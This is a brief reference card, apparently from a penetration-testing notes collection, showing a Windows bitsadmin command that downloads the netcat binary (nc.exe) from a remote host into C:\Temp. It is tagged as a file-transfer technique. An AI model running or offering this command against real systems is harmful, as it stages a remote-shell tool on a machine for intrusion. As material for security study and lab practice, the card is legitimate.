# bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe

OS: Windows
Description: Download file with bitsadmin
Security Domains: File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)